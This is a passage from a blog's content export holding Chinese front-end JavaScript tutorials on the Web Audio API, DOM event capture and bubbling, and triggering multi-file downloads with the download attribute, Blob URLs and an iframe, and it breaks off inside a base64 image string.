class="params"></span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;出了点问题~ 是否在服务器环境下运行？&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里需要注意的是，使用 webRTC 需要在服务器环境下，你可以搭建一个本地服务器，也可以把代码上传到远程服务器上测试。</p><h4>3. FileSystem</h4><p>选择本地文件，读取音频流，拿到 Blob 流地址，送入 audio 中</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">onchange</span>=<span class="string">&quot;return run(this.files);&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">controls</span> <span class="attr">id</span>=<span class="string">&quot;audio&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">run</span>(<span class="params">files</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> blob = <span class="variable language_">window</span>.<span class="property">webkitURL</span>.<span class="title function_">createObjectURL</span>(files[<span class="number">0</span>]);</span></span><br><span class="line"><span class="language-javascript">        audio.<span class="property">src</span> = blob;</span></span><br><span class="line"><span class="language-javascript">        audio.<span class="property">autoplay</span> = <span class="string">&quot;autoplay&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4>4. 移动设备，还可以使用如下方式</h4><p>1）HTML Media Capture</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;input <span class="attribute">type</span>=<span class="string">&quot;file&quot;</span> <span class="attribute">accept</span>=<span class="string">&quot;audio/*;capture=microphone&quot;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2）device 元素</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">device</span> <span class="attr">type</span>=<span class="string">&quot;media&quot;</span> <span class="attr">onchange</span>=<span class="string">&quot;update(this.data)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">device</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">autoplay</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">update</span>(<span class="params">stream</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;audio&#x27;</span>).<span class="property">src</span> = stream.<span class="property">url</span>;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></audio><h4>5. 从键盘获取</h4><p>本质并不是从键盘获取，而是通过键盘获取到我们设定的频率值，然后通过程序创建一段音频。如下面的程序：</p><p><span>下面例子中可以按键盘上中间的一排按键（A到K）来发出不同的声音。</span></p><figure class="highlight verilog"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> AudioContext=AudioContext||webkitAudioContext;</span><br><span class="line"><span class="keyword">var</span> <span class="keyword">context</span>=<span class="keyword">new</span> AudioContext;</span><br><span class="line"><span class="comment">//为每个键盘位对应一个频率</span></span><br><span class="line"><span class="keyword">var</span> s=&#123;<span class="number">65</span>:<span class="number">256</span>,<span class="number">83</span>:<span class="number">288</span>,<span class="number">68</span>:<span class="number">320</span>,<span class="number">70</span>:<span class="number">341</span>,<span class="number">71</span>:<span class="number">384</span>,<span class="number">72</span>:<span class="number">426</span>,<span class="number">74</span>:<span class="number">480</span>,<span class="number">75</span>:<span class="number">512</span>&#125;;</span><br><span class="line"><span class="comment">//为每个频率创建一个Oscillator</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i in s)</span><br><span class="line">  value=s[i],</span><br><span class="line">  s[i]=<span class="keyword">context</span><span class="variable">.createOscillator</span>(),</span><br><span class="line">  s[i]<span class="variable">.frequency</span><span class="variable">.value</span>=value,</span><br><span class="line">  s[i]<span class="variable">.start</span>();</span><br><span class="line"><span class="comment">//键盘按下时将相应频率的Oscillator连接到输出源上</span></span><br><span class="line">addEventListener(<span class="string">&quot;keydown&quot;</span>,<span class="keyword">function</span>(e)&#123;</span><br><span class="line">  <span class="keyword">if</span>(e=s[e<span class="variable">.keyCode</span>])e<span class="variable">.connect</span>(<span class="keyword">context</span><span class="variable">.destination</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//键盘松开时将相应频率的Oscillator的连接取消</span></span><br><span class="line">addEventListener(<span class="string">&quot;keyup&quot;</span>,<span class="keyword">function</span>(e)&#123;</span><br><span class="line">  <span class="keyword">if</span>(e=s[e<span class="variable">.keyCode</span>])e<span class="variable">.disconnect</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这段代码引自次碳酸钴的<a href="http://www.web-tinker.com/article/20497.html" target="_blank">博客</a>.</p><h3>三、小结</h3><p>本文是个介绍性的文章，提到了 Web Audio API 的相关知识，以及如何在你的 web 程序中引入 音频流。没有写相关 demo，感兴趣的童鞋可以复制代码自己去测试，在后续文章中会给出测试 DEMO。</p><h3>四、参考文章</h3><ul><li><a href="http://www.csdn.net/article/2013-07-10/2816178-Web-Audio-API-Firefox" target="_blank">http://www.csdn.net/article/2013-07-10/2816178-Web-Audio-API-Firefox</a> CSND</li><li><a href="//hacks.mozilla.org/2013/07/web-audio-api-comes-to-firefox/">//hacks.mozilla.org/2013/07/web-audio-api-comes-to-firefox/</a> Mozilla</li><li><a href="http://www.html5rocks.com/en/tutorials/webaudio/intro/#toc-context" target="_blank">http://www.html5rocks.com/en/tutorials/webaudio/intro/#toc-context</a> html5rocks</li><li><a href="http://www.w3.org/TR/webaudio/" target="_blank">http://www.w3.org/TR/webaudio/</a> W3 Group</li><li><a href="http://www.web-tinker.com/article/20497.html" target="_blank">http://www.web-tinker.com/article/20497.html</a>&nbsp;次碳酸钴</li></ul>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
          <category> 网络交互 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> webaudio </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript事件机制</title>
      <link href="/blog/2014/02/17/cb-problem-javascript-event/"/>
      <url>/blog/2014/02/17/cb-problem-javascript-event/</url>
      
        <content type="html"><![CDATA[<p>群里童鞋问到关于事件传播的一个问题：\事件捕获的时候，阻止冒泡，事件到达目标之后，还会冒泡吗？"。</p><p>初学 JS 的童鞋经常会有诸多疑问，我在很多 QQ 群也混了好几年了，耳濡目染也也收获了不少，以后会总结下问题的结论，顺便说说相关知识的扩展~</p><p>如果贸然回答还会冒泡，这不太好的，稍微严谨点考虑 0级 DOM 事件模型的话，这个答案是否定的。但是在 2级 DOM 事件模型中，答案是肯定的，这个问题值得探讨记录下。</p><p>本文地址：<a href="http://www.cnblogs.com/hustskyking/p/problem-javascript-event.html">http://www.cnblogs.com/hustskyking/p/problem-javascript-event.html</a>&nbsp;</p><h3>一、问题结论</h3><p>netscape 和 微软 曾经的战争还是比较火热的，当时， netscape 主张捕获方式，微软主张冒泡方式。后来 w3c 采用折中的方式，平息了战火，制定了统一的标准&mdash;&mdash;先捕获再冒泡。</p><div><strong>&nbsp;事件的触发有三个阶段</strong><ol><li>document&nbsp;往事件触发地点，捕获前进，遇到相同注册事件立即触发执行</li><li>到达事件位置，触发事件（多谢&nbsp;<span>@糖果果&nbsp;<span>指出&nbsp;<a href="#2878498">问题</a>&nbsp;，</span></span><span>@update 14/2/19</span> 如果该处既注册了冒泡事件，也注册了捕获事件，按照注册顺序执行）</li><li>事件触发地点往 document 方向，冒泡前进，遇到相同注册事件立即触发</li></ol><p>这么说很多人比较迷糊，我们在注册事件的时候，通常使用的是 捕获 或者 冒泡 的 一种：</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">obj.add<span class="constructor">EventListener(<span class="string">&quot;click&quot;</span>, <span class="params">func</span>, <span class="params">true</span>)</span>; <span class="comment">// 捕获方式</span></span><br><span class="line">obj.add<span class="constructor">EventListener(<span class="string">&quot;click&quot;</span>, <span class="params">func</span>, <span class="params">false</span>)</span>; <span class="comment">// 冒泡方式</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>事件只会因为捕获或者冒泡触发一次。举个栗子：</p><p><strong><img src="https://images.cnitblog.com/blog/387325/201402/172047332617225.jpg" alt=""></strong></p><p>点击 s2，结果是：</p><p><img src="https://images.cnitblog.com/blog/387325/201402/172049374659103.jpg" alt=""></p><p>因为这里采用的是捕获模式，从 document 往 s2 走，依次发现 s1 和 s2 都有注册捕获事件，于是便触发了，然后冒泡，没找到冒泡事件，不执行任何操作。如果将 true 改成 false，可以看到结果相反。为了更好的让你理解整个事件机制，我给他们的捕获和冒泡模式下都注册事件：</p><p><img src="https://images.cnitblog.com/blog/387325/201402/172057001398575.jpg" alt=""></p><p>结果真是太清晰了：</p><p><img src="https://images.cnitblog.com/blog/387325/201402/172057281606167.jpg" alt=""></p><h3>二、误区</h3><p>指出两个误区。</p><p><strong>1. 在同一个对象上注册事件，并不一定按照注册顺序执行</strong></p><p>这一点，从上面的例子可以看出，你随便打乱四个事件绑定的顺序，结果一般不变！出现这样结果的原因是存在捕获模式和冒泡模式。但是值得注意的是，下面 #5楼 @糖果果 提出的问题，之所以如此是因为事件目的地节点既绑定了冒泡事件也绑定了捕获事件，此时的执行顺序按照绑定的先后顺序执行（情况比较少见）。</p><p><strong>2.event.stopPropagation();就是阻止事件的冒泡</strong></p><p>这个表述不能说他错误，但是是不完整的，他除了阻止事件的冒泡，还阻止事件的继续捕获，简而言之就是阻止事件的进一步传播。下面的例子可以看到：</p><p><img src="https://images.cnitblog.com/blog/387325/201402/172104390057858.jpg" alt=""></p><p>结果是输出了 s1.</p><h3>三、拓展</h3><p><strong>1.&nbsp;stopImmediatePropagation 的使用</strong></p><p>这玩意儿是 w3c 的东西，使用的也不是特别多，我们知道 stopPropagation 可以阻止事件的进一步传播，但是他阻止不了该元素上绑定的其他函数的执行，比如我们在 obj 上绑定了 func1 和 func2，如果我们在 func1 中使用了&nbsp;stopPropagation ，那 func2 依然还是会执行出来。倘若这里使用&nbsp;stopImmediatePropagation，结果就不一样了，他不仅阻止事件的传播，还阻止 func2 的执行。如：</p><p><img src="https://images.cnitblog.com/blog/387325/201402/172112453398807.jpg" alt=""></p><p>结果是：</p><p><img src="https://images.cnitblog.com/blog/387325/201402/172113011073790.jpg" alt=""></p><p>而改成evt.stopImmediatePropagation();之后，阻止了第二个监听事件的触发：</p><p><img src="https://images.cnitblog.com/blog/387325/201402/172113246634621.jpg" alt=""></p><p>结果是：</p><p><img src="https://images.cnitblog.com/blog/387325/201402/172113354087200.jpg" alt=""></p><p><strong>2. setCapture 和 releaseCapture</strong></p><p>这两个是 IE 下的事件绑定函数，只要我们在某个元素上 setCapture 了，那么你在任何地方的鼠标操作（mouseXXX之类的动作）都会在这个元素上触发（前提是你在这个元素上绑定了事件），releaseCapture 或者本窗口失去聚焦才会释放这个绑定~</p><h3>四、小结</h3><p>对于此类知识的学习，应该查阅官方点的文档，或者看看《JavaScript权威指南》的解说，后期会经常整理诸如此类的问题。若有疑问，可以在下方评论中提出。</p></div>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript多文件下载</title>
      <link href="/blog/2014/02/12/cb-multiple-download-with-javascript/"/>
      <url>/blog/2014/02/12/cb-multiple-download-with-javascript/</url>
      
        <content type="html"><![CDATA[<p>对于文件的下载，可以说是一个十分常见的话题，前端的很多项目中都会有这样的需求，比如 highChart 统计图的导出，在线图片编辑中的图片保存，在线代码编辑的代码导出等等。而很多时候，我们只给了一个链接，用户需要右键点击链接，然后选择\另存为"，这个过程虽说不麻烦，但还是需要两步操作，倘若用户想保存页面中的多个链接文件，就得重复操作很多次，最常见的就是英语听力网站上的音频下载，手都要点麻！</p><p>本文的目的是介绍如何利用 javascript 进行多文件的下载，也就是当用户点击某个链接或者按钮的时候，同时下载多个文件。这里的\同时"用的不是很准确，在现代浏览器中可以实现多文件的并行下载，而在一些老版本浏览器，如IE8-，此类的浏览器就只能进行单个文件的下载，但是我们可以让多个文件依次保存下来，算是串行下载吧~</p><p>若要要无视实现细节，可以直接跳到第三部分，或者戳：</p><p>代码封装：<a href="//github.com/barretlee/javascript-multiple-download/blob/master/lib.js" target="_blank">lib.js</a></p><p>DEMO：<a href="http://rawgithub.com/barretlee/javascript-multiple-download/master/test/test.html" target="_blank">javascript-multiple-download</a>&nbsp;(HTTPS，第三个有bug，具体原因下面有说明)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<a href="http://qianduannotes.duapp.com/demo/javascript-multiple-download/test/test.html" target="_blank">javascript-multiple-download</a>&nbsp;(HTTP，测试正常)</p><p>本文地址：<a href="http://www.cnblogs.com/hustskyking/p/multiple-download-with-javascript.html" target="_parent">http://www.cnblogs.com/hustskyking/p/multiple-download-with-javascript.html</a>，转载请保留原文地址。</p><h3>一、文件类型介绍及其特点</h3><h4>1. 一般类型</h4><p>平时比较常见的有 txt、png、jpg、zip、tar 等各种文件格式，这些文件格式中，一部分浏览器是会直接打开链接显示内容的，而另外一部分，浏览器不识别响应头，或者不能解析对应的格式，于是当做文件直接下载下来了。如：</p><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">a</span> href=<span class="string">&quot;http://barretlee.com/test.rar&quot;</span>&gt;<span class="built_in">file</span>&lt;/<span class="keyword">a</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这句代码，若直接点开链接，浏览器将会直接下载该文件。</p><h4>2. dataURL类型</h4><p>dataURL 也是十分常见的类型，他可以作为 src 或者 url() 的参数送进去。比较常见的有如下几种：</p><figure class="highlight haskell"><table><tr><td class="code"><pre><span class="line">文本： <span class="class"><span class="keyword">data</span>:text/plain;这里是正文内容。</span></span><br><span class="line">图片： <span class="class"><span class="keyword">data</span>:image/jpg;base64,/9j/4AAQSkZJRgABAQEA....</span></span><br><span class="line">       <span class="class"><span class="keyword">data</span>:image/png;base64,/9j/4AAQSkZJRgABAQEA....</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>base64 是用的比较广泛的一种数据格式。</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">Base64格式</span><br><span class="line">data:<span class="selector-attr">[]</span><span class="selector-attr">[;charset=]</span><span class="selector-attr">[;base64]</span>,</span><br><span class="line">Base64 在CSS中的使用：</span><br><span class="line">.demoImg&#123; <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;data:image/jpg;base64,/9j/4QMZRXhpZgAASUkqAAgAAAAL....&quot;</span>); &#125;</span><br><span class="line">Base64 在HTML中的使用：</span><br><span class="line">&lt;<span class="selector-tag">img</span> <span class="attribute">width</span>=<span class="string">&quot;40&quot;</span> height=<span class="string">&quot;30&quot;</span> src=<span class="string">&quot;data:image/jpg;base64,/9j/4QMZRXhpZgAASUkqAAgAAAAL....&quot;</span>&gt;      </span><br><span class="line"></span><br></pre></td></tr></table></figure><h4>3. Blob 流</h4><p>Blob 对象表示不可变的、包含原始数据的类文件对象。具体的内容可以参阅<a href="//developer.mozilla.org/en-US/docs/Web/API/Blob" target="_blank">MDN文档</a>。</p><p>他的使用也是特别的方便，如：</p><figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">var aFileParts = [&#x27;<span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">&quot;a&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">b</span> <span class="attr">id</span>=<span class="string">&quot;b&quot;</span>&gt;</span>hey!<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>&#x27;];</span></span><br><span class="line"><span class="language-xml">var oMyBlob = new Blob(aFileParts, </span><span class="template-variable">&#123;type : &#x27;text/html&#x27;&#125;</span><span class="language-xml">); // the blob</span></span><br><span class="line"><span class="language-xml"></span></span><br></pre></td></tr></table></figure><p>Blob 接收两个参数，一个是数组类型的数据对象，他可以是 ArrayBuffer、ArrayBufferView、Blob、String 等诸多类型；第二个参数是 MINE 类型设置。而本文我们要用到的是 <code>URLcreateObjectURL()</code> 这个函数，他的作用是将一个 URL 所代表的内容转化成一个 <a href="//developer.mozilla.org/en-US/docs/Web/API/DOMString" target="_blank">DOMString</a>，产生的结果是一个 文件对象 或者 Blob 对象。</p><h4>4. 二进制流</h4><p>我们利用 File API 读取文件的时候，拿到的是数据的二进制流格式，这些类型可以直接被 ArrayBuffer 等接收，本文中没有用到，就不细说了。</p><h3>二、JavaScript 多文件下载</h3><p>HTML5 中 a 标签多了一个属性&mdash;&mdash;download，用户点击链接浏览器会打开并显示该链接的内容，若在链接中加了 download 属性，点击该链接不会打开这个文件，而是直接下载。虽说是比较好用，但低版本浏览器不兼容，这个在本节的 2 和 3 中将会讲到解决方案。</p><p>在这里，我们可以利用&nbsp;<span>属性检测</span>&nbsp;UA 来判断浏览器类型：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">h5Down = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;a&quot;</span>).<span class="title function_">hasOwnProperty</span>(<span class="string">&quot;download&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> h5Down = !<span class="regexp">/Trident|MSIE/</span>.<span class="title function_">test</span>(navigator.<span class="property">userAgent</span>); <span class="comment">// Trident 标识 IE11</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4>1. a 标签 download 属性的使用</h4><p><strong>注：FF5.0 / Safari5.0 / Opera11.1 / IE9.0 不支持 download 属性</strong></p><p>利用 download 属性可以直接下载单个文件，若想点击一次下载多个文件，就得稍加处理下了：</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> download<span class="constructor">File(<span class="params">fileName</span>, <span class="params">content</span>)</span>&#123;</span><br><span class="line">    var aLink = document.create<span class="constructor">Element(<span class="string">&quot;a&quot;</span>)</span>,</span><br><span class="line">        evt = document.create<span class="constructor">Event(<span class="string">&quot;HTMLEvents&quot;</span>)</span>;</span><br><span class="line"></span><br><span class="line">    evt.init<span class="constructor">Event(<span class="string">&quot;click&quot;</span>)</span>;</span><br><span class="line">    aLink.download = fileName;</span><br><span class="line">    aLink.href = content;</span><br><span class="line"></span><br><span class="line">    aLink.dispatch<span class="constructor">Event(<span class="params">evt</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>download 属性的作用除了让浏览器忽略文件的 MIME 类型之外，还会把该属性的值作为文件名。你可以在 chrome 控制台运行这句程序：</p><figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">downloadFile(<span class="string">&quot;barretlee.html&quot;</span>, <span class="string">&quot;./&quot;</span>)<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>浏览器会提示是否保留（下载）该 html 文件。之前我们提到文件类型还可能是 dataURL 或者是 Blob 流，为了让程序也支持这些数据类型，稍微修改下上面的函数：</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> download<span class="constructor">File(<span class="params">fileName</span>, <span class="params">content</span>)</span>&#123;</span><br><span class="line">    var aLink = document.create<span class="constructor">Element(&#x27;<span class="params">a</span>&#x27;)</span>;</span><br><span class="line">      , blob = <span class="keyword">new</span> <span class="constructor">Blob([<span class="params">content</span>])</span></span><br><span class="line">      , evt = document.create<span class="constructor">Event(<span class="string">&quot;HTMLEvents&quot;</span>)</span>;</span><br><span class="line"></span><br><span class="line">    evt.init<span class="constructor">Event(<span class="string">&quot;click&quot;</span>)</span>;</span><br><span class="line"></span><br><span class="line">    aLink.download = fileName;</span><br><span class="line">    aLink.href = <span class="module-access"><span class="module"><span class="identifier">URL</span>.</span></span>create<span class="constructor">ObjectURL(<span class="params">blob</span>)</span>;</span><br><span class="line">    aLink.dispatch<span class="constructor">Event(<span class="params">evt</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>new Blob([content])</code>，现将文件转换成一个 Blog 流，然后，使用 <code>URL.createObjectURL()</code> 将其转换成一个 DOMString。这样我们就支持 data64 和其他数据类型的 content 了~</p><h4>2. window.open 之后 execCommand("SaveAs")</h4><p>上面也提到了，尽管 download 属性是十分便利的 H5 利器，但低版本 IE 根本不赏脸，要说方法，IE 还是有很多方式去转换的，比如 ADOBE.STREAM 的 activeX 对象可以把文件转换成文件流，然后写入到一个要保存的文件中。这里要谈到的是略微方便一点的方式：先把内容写到一个新开的 window 对象中，然后利用 execCommand 执行保存命令，就相当于我们在页面上按下 Ctrl+S，这样页面内的信息都会 down 下来。</p><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将文件在一个 window 窗口中打开，并隐藏这个窗口。</span></span><br><span class="line"><span class="keyword">var</span> <span class="keyword">win</span> = <span class="keyword">window</span>.<span class="keyword">open</span>(<span class="string">&quot;path/to/file.ext&quot;</span>, <span class="string">&quot;new Window&quot;</span>, <span class="string">&quot;width=0,height=0&quot;</span>);</span><br><span class="line"><span class="comment">// 在 win 窗口中按下 ctrl+s 保存窗口内容</span></span><br><span class="line"><span class="keyword">win</span>.document.execCommand(<span class="string">&quot;SaveAs&quot;</span>, true, <span class="string">&quot;filename.ext&quot;</span>);</span><br><span class="line"><span class="comment">// 使用完了，关闭窗口</span></span><br><span class="line"><span class="keyword">win</span>.<span class="keyword">close</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个过程十分明了，不过这里会存在一个问题，并不是程序的问题，而是浏览器的问题，如果我们用 搜狗浏览器 或者 360浏览器 打开新窗口的话，他会新开一个标签页，而不是新开一个窗口，更可恶的是部分浏览器拦截 window.open 的窗口（这个可以设置）。所以只好另觅他法了。</p><h4>3. iframe 中操作</h4><p>既然新开一个窗口那么麻烦，我就在本窗口下完成工作~</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="constructor">IEdownloadFile(<span class="params">fileName</span>, <span class="params">contentOrPath</span>)</span>&#123;</span><br><span class="line">    var ifr = document.create<span class="constructor">Element(&#x27;<span class="params">iframe</span>&#x27;)</span>;</span><br><span class="line"></span><br><span class="line">    ifr.style.display = &#x27;none&#x27;;</span><br><span class="line">    ifr.src = contentOrPath;</span><br><span class="line"></span><br><span class="line">    document.body.append<span class="constructor">Child(<span class="params">ifr</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 保存页面 -&gt; 保存文件</span></span><br><span class="line">    ifr.contentWindow.document.exec<span class="constructor">Command(&#x27;SaveAs&#x27;, <span class="params">false</span>, <span class="params">fileName</span>)</span>;</span><br><span class="line">    document.body.remove<span class="constructor">Child(<span class="params">ifr</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一般的链接我们可以直接给 iframe 添加 src 属性，然后执行 saveAs 命令，倘若我们使用的是 data64 编码的文件，这个怎么办？</p><figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line"><span class="built_in">var</span> isImg = contentOrPath.slice(<span class="number">0</span>, <span class="number">10</span>) === <span class="string">&quot;data:image&quot;</span>；</span><br><span class="line"></span><br><span class="line"><span class="comment">// dataURL 的情况</span></span><br><span class="line">isImg &amp;&amp; ifr.contentWindow.document.write(<span class="string">&quot;&lt;img src=&quot;</span><span class="string">&quot; +</span></span><br><span class="line"><span class="string">        contentOrPath + &quot;</span><span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个也比较好处理，直接把文件写入到 iframe 中，然后在执行保存。</p><h3>三、代码的封装与接口介绍</h3><h4>1. 代码的封装以及相关 DEMO</h4><p>封装：<a href="//github.com/barretlee/javascript-multiple-download/blob/master/lib.js" target="_blank">lib.js</a></p><p>DEMO：<a href="http://rawgithub.com/barretlee/javascript-multiple-download/master/test/test.html" target="_blank">javascript-multiple-download</a>&nbsp;(HTTPS，第三个有bug)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<a href="http://qianduannotes.duapp.com/demo/javascript-multiple-download/test/test.html" target="_blank">javascript-multiple-download</a>&nbsp;(HTTP，测试正常)</p><p>Bug 说明，经过一番细节处理之后，基本兼容各个浏览器，我把代码放在 //raw.github.com 上托管，可能因为是 https 传输，第三个测试中报错了，报错的具体内容是：<span>HTTPS 安全受到 http://rawgithub.com/barretlee/javascript-multiple-download/master/file/test.jpg 的威胁</span>，而 test.txt 文件没有报错。放到 http 协议下测试运行结果是可观的。（<span>这点我没有去深究，肯定是有深层安全方面原因的，难道就因为他是 jpg图片格式？ </span>&nbsp; 谢&nbsp;<a href="//www.imququ.com/" target="_blank">@屈屈</a><span>&nbsp;</span>提醒，跨协议传输存在安全问题）后面的 demo 我放在 BAE 上，没有问题，不过没测试 safari 和 opera。</p><h4>2. 接口的调用</h4><p>提供了三个接口，支持单文件下载，多文件下载，多文件下载自定义命名。</p><p>1）单文件下载</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">Downer(<span class="string">&quot;./file/test.txt&quot;</span>)<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2）多文件下载</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">Downer(<span class="selector-attr">[<span class="string">&quot;./file/test.txt&quot;</span>,<span class="string">&quot;./file/test.txt&quot;</span>]</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3）多文件下载自定义命名</p><figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">Downer(&#123;</span><br><span class="line">    <span class="string">&quot;1.txt&quot;</span>:<span class="string">&quot;./file/test.txt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;2.jpg&quot;</span>:<span class="string">&quot;./file/test.jpg&quot;</span></span><br><span class="line">&#125;)<span class="comment">; </span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>文件的 URL 如 <code>./file/test.jpg</code> 都可以改成 base64 或者其他格式,如：</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="constructor">Downer(&#123;     <span class="operator">/</span><span class="operator">/</span>这是一个很长的 <span class="params">dataURI</span>，我用负的<span class="params">text</span>-<span class="params">indent</span>隐藏了，可直接复制    <span class="string">&quot;data64.jpg&quot;</span> : <span class="string">&quot;data:image/jpg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAMCAgMCAgMDAwMEAwMEBQgFBQQEBQoHBwYIDAoMDAsKCwsNDhIQDQ4RDgsLEBYQERMUFRUVDA8XGBYUGBIUFRT/2wBDAQMEBAUEBQkFBQkUDQsNFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBT/wAARCAAYADsDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD9NgKKK8w8beO/EMVzGdJ08W2jW2t2WnXGpLdx+e7PPEkii3eJgYj5mwsJFkzkquAC3VFc0lFf10/UOlz1CivO9H+LEmreP7jw8mlBrLfPDa6nC1y0cksX30Z2t1hGCHBEcsjAqQVHOJPCfjnxFc+HNU1rxPpmh6Vp9mt232i01WWXmGV0IdXt0CrhD8+45xnaM4A00uZ9rgtZcq3vb5noFLXCfDz4j3vjbT9XM+hSabqdhtItWFxGswZCybTc28DjJDAkx7fRjzi/qmv6zH8LdR1m6sP+Ef12PSprprPzkufssyxMwXeBtfBA5xg0OLi2n/Vwh